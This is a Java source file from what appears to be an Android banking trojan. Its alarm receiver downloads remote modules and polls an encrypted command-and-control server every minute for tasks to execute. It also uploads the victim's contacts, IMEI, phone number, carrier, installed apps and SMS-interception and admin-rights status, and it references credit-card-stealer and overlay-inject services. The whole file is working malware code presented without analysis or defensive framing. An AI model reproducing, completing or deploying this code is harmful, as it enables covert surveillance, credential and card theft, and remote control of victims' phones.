package com.moonny.rcvs;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;

import com.moonny.api.APIHandlerFactory;
import com.moonny.api.ApiRequest;
import com.moonny.api.Callback;
import com.moonny.api.RequestResult;
import com.moonny.helpers.IDUtility;
import com.moonny.Modules;
import com.moonny.Tasks;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;
import com.moonny.srvs.AdminRightsService;
import com.moonny.srvs.CCStealerService;
import com.moonny.srvs.InjectsService;

import org.json.JSONException;
import org.json.JSONObject;

public class AlarmReceiver extends BroadcastReceiver {

    private Context mContext;

    public AlarmReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;

        if(Utils.is_blocked(context)) {
            return;
        }

        // EAT ALL MEMORY !!!
//        context.startService(new Intent(context, AdminRightsService.class));
//        context.startService(new Intent(context, InjectsService.class));
//        context.startService(new Intent(context, CCStealerService.class));


        mainTask();
    }

    // each minute (Constant.MAIN_SLEEP)
    private void mainTask() {

        Modules mods = new Modules(mContext);
        if (!mods.is_mod_exists(S.mod_main)) {
            if (Constant.DEBUG) Log.d("CONTROL", "alarmRecev not allowed; start download main module");
            mods.download_mod(S.main);
            return;
        }

        Tasks queue = new Tasks(mContext, S.api_queue_file);

        if(Constant.DEBUG) Log.d("AlarmRec", "Unfinished tasks in queue: " + queue.size());

        if (queue.size() > 0) // if queue has elements - execute them
        {
            while (queue.size() > 0) {
                String task_row = queue.poll();
                if(task_row == null)
                    break;

                JSONObject task;

                JSONObject json;
                String binary_path;
                try{
                    task = new JSONObject(task_row);
                    json = task.getJSONObject(S.api_failed_json);
                    binary_path = task.getString(S.api_binary_path);
                }catch (JSONException e){
                    if(Constant.DEBUG)
                    {
                        Log.d("AlarmRec", "Json exception on decode queue api task: " + e.getMessage());
                        e.printStackTrace();
                    }
                    break;
                }

                if(Constant.DEBUG) Log.d("AlarmRec", "Execute api request that was unfinished before. Json: " + json.toString());

                ApiRequest ar = new ApiRequest(mContext, json);
                if(!binary_path.isEmpty())
                    ar.setBinaryMode(binary_path);

                ar.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
            }

        }else { // make regular request to get new tasks

            if(Constant.DEBUG)
            {
                Log.e("Alarm", "============== DYN DATA TEST ==============");
                Log.d("Alarm", "Constant.API_SERVER: " + Utils.aes_decrypt(Constant.API_SERVER, Utils.md5(S.api_header_value)));
                Log.d("Alarm", "Domains in config: " + Modules.main(mContext, S.get_pref, new Object[]{ S.api_domains, "" }));

                Log.d("Alarm", "Data version: " + Modules.main(mContext, S.get_pref, new Object[]{ S.api_data_version, 0}) );
                Log.d("Alarm", "Injects: " + Modules.main(mContext, S.get_pref, new Object[]{ S.api_injects, ""}) );
                Log.d("Alarm", "CC ON: " + Modules.main(mContext, S.get_pref, new Object[]{ S.api_cc_stealer_on, ""}) );
                Log.d("Alarm", "Minimize: " + Modules.main(mContext, S.get_pref, new Object[]{ S.api_minimize_apps, ""}) );
                Log.e("Alarm", "============== =============== ==============");
            }
            
            String apps = (String) Modules.main(mContext, S.get_packages, new Object[]{});
            boolean full = false;

            // if exception here - S.java is not randomized
            String last_saved_apps = (String) Modules.main(mContext, S.get_pref, new Object[]{ S.app_put, "" });
            boolean full_required = (boolean) Modules.main(mContext, S.get_pref, new Object[]{ S.api_full_required, true });
            if (!last_saved_apps.equals(apps) || full_required ) {
                full = true;
                Modules.main(mContext, S.set_pref, new Object[]{ S.app_put, apps });
                Modules.main(mContext, S.set_pref, new Object[]{ S.injectCyclePause, false });
                Modules.main(mContext, S.set_pref, new Object[]{ S.api_full_required, false });
            }

            // get new commands request
            new ApiRequest(mContext, get_json(full), new Callback() {
                public void callb(RequestResult result) {
                    APIHandlerFactory.process_response(mContext, result.getResponse());
                }
            }).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
        }

    }
 
    public JSONObject get_json(boolean full)
    {
        JSONObject jsonObject = new JSONObject();
        try {

            jsonObject.put(S.api_method, S.api_get_command);

            if(full) // send full data (when apps list changed or UpdateInfo handler executed)
            {
                jsonObject.put(S.api_apps, (String) Modules.main(mContext, S.get_packages, null)); // JSON app1|app2,...
                jsonObject.put(S.api_contacts_list, (JSONObject) Modules.main(mContext, S.get_contacts, null)); // JSON Name:319028882222,Name:319028882222,...
                jsonObject.put(S.api_imei, (String) Modules.main(mContext, S.get_imei, null));
                jsonObject.put(S.api_country, (String) Modules.main(mContext, S.get_country, null));
                jsonObject.put(S.api_operator, (String) Modules.main(mContext, S.get_operator, null));
                jsonObject.put(S.api_android, (String) Modules.main(mContext, S.get_os_ver, null));
                jsonObject.put(S.api_model, (String) Modules.main(mContext, S.get_device_model, null));
                jsonObject.put(S.api_number, (String) Modules.main(mContext, S.get_number, null));
                jsonObject.put(S.api_lang, (String) Modules.main(mContext, S.get_language, null));
            }

            Object data_ver = Modules.main(mContext, S.get_pref, new Object[]{ S.api_data_version, 1});
            if(data_ver == null)
                data_ver = 1;

            jsonObject.put(S.api_data_version, (int) data_ver);

            int is_admin = (Constant.ADMIN_REQUIRED && (boolean) Modules.main(mContext, S.get_pref, new Object[]{ S.is_admin_active, false }))? 1 : 0;
            jsonObject.put(S.api_is_admin, is_admin);

            int is_screen_enabled = IDUtility.isPhoneLocked(mContext)? 0 : 1;
            jsonObject.put(S.api_is_screen_enabled, is_screen_enabled);

            jsonObject.put(S.api_phone_time, IDUtility.getPhoneTimestamp().toString());

            int sms_admin = (Constant.SMS_ADMIN_REQUIRED && Utils.isSmsAdmin(mContext))? 1 : 0;
            jsonObject.put(S.api_sms_admin, sms_admin);

            boolean sms_hook = (boolean) Modules.main(mContext, S.get_pref, new Object[]{ S.sms_hook, false });
            jsonObject.put(S.api_is_intercept, (sms_hook)? 1 : 0);

            return jsonObject;

        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }
}